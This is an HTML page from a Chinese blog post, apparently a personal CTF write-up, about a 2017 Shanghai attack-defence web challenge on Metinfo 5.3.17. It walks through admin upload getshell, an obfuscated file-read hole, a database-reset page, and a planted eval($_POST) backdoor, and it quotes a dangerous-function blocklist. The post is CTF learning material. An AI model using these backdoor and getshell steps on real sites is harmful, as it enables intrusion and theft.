@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="48x48" href="/images/favicon-48x48-next.png">
+  <link rel="icon" type="image/png" sizes="48x48" href="/images/favicon-48x48-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Mist","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="0x00 前言首先会回过头来重新分析一次这道web题主要是因为上次线下的时候全场一直在打了一个洞，最后成信的师傅用重置数据库方法，从后台getshell一路追分，这里先膜一发。这次web题的框架是Metinfo 5.3.17的。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2017上海赛线下攻防Web题分析">
+<meta property="og:url" content="http://yoursite.com/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Cyc1e&#39;s Blog">
+<meta property="og:description" content="0x00 前言首先会回过头来重新分析一次这道web题主要是因为上次线下的时候全场一直在打了一个洞，最后成信的师傅用重置数据库方法，从后台getshell一路追分，这里先膜一发。这次web题的框架是Metinfo 5.3.17的。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-bc2325f23d35affd.png">
+<meta property="og:image" content="http://yoursite.com/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-15bd7af93d209fda.png">
+<meta property="og:image" content="http://yoursite.com/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-8fdc8f0abaf18052.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-a677562380059b89.png">
+<meta property="og:image" content="http://yoursite.com/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-640ee3a29ec2e4db.png">
+<meta property="og:image" content="http://yoursite.com/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-796a9719aa2b0afb.png">
+<meta property="og:image" content="http://yoursite.com/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-3166828be770c331.png">
+<meta property="article:published_time" content="2017-12-12T14:03:51.000Z">
+<meta property="article:modified_time" content="2020-03-04T09:00:10.464Z">
+<meta property="article:author" content="Cyc1e">
+<meta property="article:tag" content="AWD">
+<meta property="article:tag" content="cms">
+<meta property="article:tag" content="php">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-bc2325f23d35affd.png">
+
+<link rel="canonical" href="http://yoursite.com/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true
+  };
+</script>
+
+  <title>2017上海赛线下攻防Web题分析 | Cyc1e's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Cyc1e's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Cyc1e's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="Cyc1e">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cyc1e's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2017上海赛线下攻防Web题分析
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2017-12-12 22:03:51" itemprop="dateCreated datePublished" datetime="2017-12-12T22:03:51+08:00">2017-12-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-03-04 17:00:10" itemprop="dateModified" datetime="2020-03-04T17:00:10+08:00">2020-03-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Cyc1e%E7%9A%84CTF%E4%B9%8B%E8%B7%AF/" itemprop="url" rel="index"><span itemprop="name">Cyc1e的CTF之路</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.7k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>首先会回过头来重新分析一次这道web题主要是因为上次线下的时候全场一直在打了一个洞，最后成信的师傅用重置数据库方法，从后台getshell一路追分，这里先膜一发。这次web题的框架是Metinfo 5.3.17的。</p>
+<h2 id="0x01-后台getshell"><a href="#0x01-后台getshell" class="headerlink" title="0x01 后台getshell"></a>0x01 后台getshell</h2><p>这个洞也可以说是坑了一波，以前都调过Metinfo的后台恢复数据库文件getshell，在：安全—&gt;备份与恢复 中通过上传数据库备份.zip文件getshell，这里主要是因为:admin\include\uploadify.php</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">elseif($type==<span class="string">'skin'</span>)&#123;</span><br><span class="line">/*模板文件*<span class="regexp">/</span></span><br><span class="line"><span class="regexp">$filetype=explode('.',$_FILES['Filedata']['name']);</span></span><br><span class="line"><span class="regexp">if($filetype[count($filetype)-1]=='zip')&#123;</span></span><br><span class="line"><span class="regexp">if(stristr($met_file_format,'zip') === false)&#123;</span></span><br><span class="line"><span class="regexp">echo $lang_jsx36;</span></span><br><span class="line"><span class="regexp">die();</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/if(!is_writable('../</span>../templates/<span class="string">'))@chmod('</span>../../templates/<span class="string">',0777);</span></span><br><span class="line"><span class="string">$filenamearray=explode('</span>.zip<span class="string">',$_FILES['</span>Filedata<span class="string">']['</span>name<span class="string">']);</span></span><br><span class="line"><span class="string">$skin_if=$db-&gt;get_one("SELECT * FROM &#123;$met_skin_table&#125; WHERE skin_file='</span>&#123;$filenamearray[<span class="number">0</span>]&#125;<span class="string">'");</span></span><br><span class="line"><span class="string">if($skin_if)&#123;</span></span><br><span class="line"><span class="string">$metinfo=$lang_loginSkin;</span></span><br><span class="line"><span class="string">&#125;else&#123;</span></span><br><span class="line"><span class="string">$f = new upfile('</span>zip<span class="string">','</span>../../templates/<span class="string">','</span><span class="string">','</span><span class="string">');</span></span><br><span class="line"><span class="string">if($f-&gt;get_error())&#123;</span></span><br><span class="line"><span class="string">echo $f-&gt;get_errorcode();</span></span><br><span class="line"><span class="string">die();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">if(file_exists('</span>../../templates/<span class="string">'.$filenamearray[0].'</span>.zip<span class="string">'))$filenamearray[0]='</span>metinfo<span class="string">'.$filenamearray[0];</span></span><br><span class="line"><span class="string">$met_upsql = $f-&gt;upload('</span>Filedata<span class="string">',$filenamearray[0]);</span></span><br><span class="line"><span class="string">include "pclzip.lib.php";</span></span><br><span class="line"><span class="string">$archive = new PclZip('</span>../../templates/<span class="string">'.$filenamearray[0].'</span>.zip<span class="string">');</span></span><br><span class="line"><span class="string">if($archive-&gt;extract(PCLZIP_OPT_PATH, '</span>../../templates/<span class="string">') == 0)$metinfo=$archive-&gt;errorInfo(true);</span></span><br><span class="line"><span class="string">$list = $archive-&gt;listContent();</span></span><br><span class="line"><span class="string">$error=0;</span></span><br><span class="line"><span class="string">foreach($list as $key=&gt;$val)&#123;</span></span><br><span class="line"><span class="string">if(preg_match("/\.(asp|aspx|jsp)/i",$val[filename]))&#123;</span></span><br><span class="line"><span class="string">$error=1;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">if(!is_dir('</span>../../templates/<span class="string">'.$val[filename])&amp;&amp;preg_match("/\.(php)/i",$val[filename]))&#123;</span></span><br><span class="line"><span class="string">$danger=explode('</span><span class="params">|','preg_replace|</span>assert<span class="params">|dirname|</span>file_exists<span class="params">|file_get_contents|</span>file_put_contents<span class="params">|fopen|</span>mkdir<span class="params">|unlink|</span>readfile<span class="params">|eval|</span>cmd<span class="params">|passthru|</span>system<span class="params">|gzuncompress|</span>exec<span class="params">|shell_exec|</span>fsockopen<span class="params">|pfsockopen|</span>proc_open<span class="params">|scandir');</span></span><br><span class="line"><span class="params">$ban='preg_replace|</span>assert<span class="params">|eval|</span>\$_POST<span class="params">|\$_GET';</span></span><br><span class="line"><span class="params">foreach($danger as $key1 =&gt; $val1)&#123;</span></span><br><span class="line"><span class="params">$str=file_get_contents('../../templates/'.$val[filename]);</span></span><br><span class="line"><span class="params">$str=str_replace(array('\'','"','.'),'',$str);</span></span><br><span class="line"><span class="params"><span class="keyword">if</span>(preg_match("/([^A-Za-z0-9_]$val1)[\r\n\t]&#123;0,&#125;([\[\(])/i",$str))&#123;</span></span><br><span class="line"><span class="params">$error=1;</span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params"><span class="keyword">if</span>(preg_match('/('.$ban.')/i',$str))&#123;</span></span><br><span class="line"><span class="params">$error=1;</span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params">@unlink('../../templates/'.$filenamearray[0].'.zip');</span></span><br><span class="line"><span class="params"><span class="keyword">if</span>($error)&#123;</span></span><br><span class="line"><span class="params">foreach($list as $key=&gt;$val)&#123;</span></span><br><span class="line"><span class="params"><span class="keyword">if</span>(is_dir('../../templates/'.$val[filename]))&#123;</span></span><br><span class="line"><span class="params">@deldir('../../templates/'.$val[filename]);</span></span><br><span class="line"><span class="params">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="params">@unlink('../../templates/'.$val[filename]);</span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params">$metinfo='含有危险函数，禁止上传！！';</span></span><br><span class="line"><span class="params">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="params">$metinfo='1$'.$filenamearray[0];</span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>上传的.zip文件会自动解压，上传成功后在/templates目录下生成shell，由于本次源码被调整过，在恢复备份文件处有一个资源调用的问题，导致打开的时候特别慢，可以说没法利用吧，而这次主要是利用另一个上传点，直接通过修改上传文件类型来上传.php文件：安全-&gt;安全与效率-&gt;上传文件<br><img src="/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-bc2325f23d35affd.png" alt><br>这种getshell的方法不要智商的，所以就不多说了。</p>
+<h2 id="0x02-混淆源码命令执行"><a href="#0x02-混淆源码命令执行" class="headerlink" title="0x02 混淆源码命令执行"></a>0x02 混淆源码命令执行</h2><p>利用点：produ/picture.inc.php文件，源码进行混淆过，所以挖掘的时候必须首先解混淆，这里我是直接上网进行源码修复的，修复出来简单修改一下变量也基本就能看懂。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># MetInfo Enterprise Content Management System </span></span><br><span class="line"><span class="comment"># Copyright (C) MetInfo Co.,Ltd (http:</span></span><br><span class="line">$b=@$_GET[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'Y2hlYw=='</span>)];</span><br><span class="line"><span class="keyword">if</span> ($b!=<span class="string">""</span>) </span><br><span class="line">&#123;</span><br><span class="line">	$a = $GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSUkx'</span>)](md5($b),<span class="number">0</span>,<span class="number">9</span>);</span><br><span class="line">	$c = $GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSUkx'</span>)](md5($a),<span class="number">5</span>,<span class="number">18</span>);</span><br><span class="line">	$c = md5($c);</span><br><span class="line">	echo $c;</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$d = @$_GET[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'img_tet'</span>)];</span><br><span class="line">$d = $GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSWwx'</span>)]($d);</span><br><span class="line">$d = str_replace( $GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'flag'</span>),<span class="string">""</span>,$d);</span><br><span class="line"><span class="keyword">if</span> ($d!=<span class="string">""</span>) </span><br><span class="line">&#123;</span><br><span class="line">	$GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSTFJ'</span>)]($GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'Content-Type: imgage/jpeg'</span>));</span><br><span class="line">	$GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSTFJ'</span>)]($GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'Content-Disposition: attachment; filename='</span>).$d);</span><br><span class="line">	$GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSTFJ'</span>)]($GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'Content-Lengh: '</span>).$GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSTFs'</span>)]($d));</span><br><span class="line">	$e = $GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJbElJ'</span>)]($d,<span class="string">"r"</span>) <span class="keyword">or</span> die(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">	$f = $GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJbEkx'</span>)]($e,$GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSTFs'</span>)]($d));</span><br><span class="line">	$GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJbGxJ'</span>)]($e);</span><br><span class="line">	echo $f;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">echo $GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'Cg=='</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>也就是Get一个参数img_tet,检测传参内容是否有flag，有的话就替换为空格所以直接利用：cat /flflagag就可以绕过检测，这也是全场一次在打的一个洞。下面也贴出其他师傅解混淆的方法，建一个php文件</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'picture.inc.php'</span>);</span><br><span class="line">var_dump(get_defined_vars());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>调用函数var_dump(get_defined_vars())进行反混淆，本地运行可以得到一样的源码。<img src="/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-15bd7af93d209fda.png" alt><br>这里直接贴出BXS师傅完全修复的源码：<img src="/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-8fdc8f0abaf18052.jpg" alt></p>
+<h2 id="0x03-重置数据库"><a href="#0x03-重置数据库" class="headerlink" title="0x03 重置数据库"></a>0x03 重置数据库</h2><p>利用安装框架的配置文件，重置数据库这个也是迷，不过利用起来也是没有难度的，主要就看能不能找到这个页面了，估计是主办方故意留下这个页面的，利用方法，直接访问 \include\frame 目录下 index.php，直接就进入了配置页面<br><img src="/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-a677562380059b89.png" alt></p>
+<p>跟着走一遍，重置一下网站，然后跳第一步Getshell就好。</p>
+<h2 id="0x04-主办方设置的后门利用"><a href="#0x04-主办方设置的后门利用" class="headerlink" title="0x04 主办方设置的后门利用"></a>0x04 主办方设置的后门利用</h2><p>对于这个后门，调试也是到了比赛结束后，about/show.php 30、31行</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$show_tiny=create_function(<span class="string">""</span>, base64_decode(<span class="string">'QGV2YWwoJF9QT1NUWyJpY3FjdGZlciJdKTs='</span>));</span><br><span class="line">$show_tiny();</span><br></pre></td></tr></table></figure>
+<p>解base64后得到的是一个自带后门：@eval($_POST[“icqctfer”]);<br>当时在现场的时候看到这个就直接在show.php后用POST传参icqctfer=<strong>****</strong>，没有得到任何想要的结果，当时还以为大家都补了，没有注意到源码中还有限制条件，主要是在show.php中的<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(!$id &amp;&amp; $class1)$id &#x3D; $class1;</span><br><span class="line">if(!is_numeric($id))okinfo(&#39;..&#x2F;404.html&#39;);</span><br><span class="line">$show &#x3D; $db-&gt;get_one(&quot;SELECT * FROM $met_column WHERE id&#x3D;&#39;$id&#39; and module&#x3D;1&quot;);</span><br><span class="line">if(!$show||!$show[&#39;isshow&#39;])&#123;</span><br><span class="line">okinfo(&#39;..&#x2F;404.html&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>is_numeric()函数要求变量id要是数字，这个地方比较好过，由于对$id没有做任何限制的，我们可以在本地调试测试，把变量id覆盖就好了，不过后面的查询语句也要求了id值得赋成1，payload:<a href="http://127.0.0.1/CTF/shanghai/default/about/show.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/CTF/shanghai/default/about/show.php?id=1</a><br>之后主要是$show变量的问题， $db-&gt;get_one(“SELECT * FROM $met_column WHERE id=’$id’ and module=1”)将表met_column的第一行信息以数组的方式赋值给变量show，本地查看数据库<br><img src="/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-640ee3a29ec2e4db.png" alt><br>其中isshow列默认值为 0<br><img src="/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-796a9719aa2b0afb.png" alt><br>而要过条件if(!$show||!$show[‘isshow’])只有当$show = 1或者$show[‘isshow’] = 1，而从数据库中看来使得$show = 1是不可能的，我们没法把对方的数据库id = 1的所有信息都置1，所以只有将$show[‘isshow’]置 1 。而要将变量$show[‘isshow’]置 1，需要进入Metinfo后台：设置-&gt;栏目 中修改about的参数，将 添加内容 段改成允许，就可以将isshow置为1,从而通过条件，就可以利用icqctfer了。<br><img src="/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-3166828be770c331.png" alt><br>那么问题来了，要想进后台修改配置利用这个后门，除非一上手在别人没改密码之前进入别人后台修改，等大家都把后台密码改了，也就只有通过重置数据库的方法进入后台，既然后重置数据库进入后台了，还不如上传木马来打，所以这个后门看似简单，其实用起来太麻烦，价值也不高。</p>
+<h2 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05 结语"></a>0x05 结语</h2><p>本菜因才疏学浅，只挖到了部分的洞，因为上次在场上的时候有师傅直接把网站页面给改写了，说明还有其他的利用点，这里膜一下，本文章只用来学习记录。</p>
+
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+            <div class="social-item">
